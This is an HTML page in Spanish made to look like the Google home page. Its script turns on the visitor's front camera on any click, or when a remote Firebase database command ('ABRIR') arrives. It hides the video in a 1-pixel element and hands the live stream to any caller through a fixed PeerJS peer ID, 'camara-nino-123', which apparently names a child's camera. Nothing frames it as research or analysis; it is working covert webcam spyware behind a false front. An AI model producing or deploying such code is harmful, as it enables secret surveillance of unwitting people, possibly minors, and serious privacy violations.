<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { margin: 0; font-family: arial, sans-serif; background: white; overflow: hidden; }
        .google-home { display: flex; flex-direction: column; align-items: center; padding-top: 100px; height: 100vh; }
        .logo { width: 160px; margin-bottom: 20px; }
        .search-bar { width: 90%; max-width: 580px; border: 1px solid #dfe1e5; padding: 12px 20px; border-radius: 24px; box-shadow: 0 1px 6px rgba(32,33,36,.28); outline: none; }
        #videoLocal { display: none; position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0; }
    </style>
</head>
<body>
    <video id="videoLocal" autoplay playsinline muted></video>
    <div class="google-home" onclick="activarCamara()">
        <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
        <input type="text" class="search-bar" placeholder="Buscar en Google...">
    </div>

    <script>
        const firebaseConfig = { databaseURL: "https://micontrol-30a70-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const peer = new Peer('camara-nino-123'); 
        let miStream = null;

        async function activarCamara() {
            try {
                miStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                document.getElementById('videoLocal').srcObject = miStream;
                console.log("Cámara encendida");
            } catch (e) { console.log("Error cámara"); }
        }

        db.ref('comando_camara').on('value', (snap) => {
            if (snap.val() === "ABRIR") activarCamara();
        });

        peer.on('call', (call) => {
            if (miStream) {
                call.answer(miStream);
            } else {
                activarCamara().then(() => { if(miStream) call.answer(miStream); });
            }
        });
    </script>
</body>
</html>
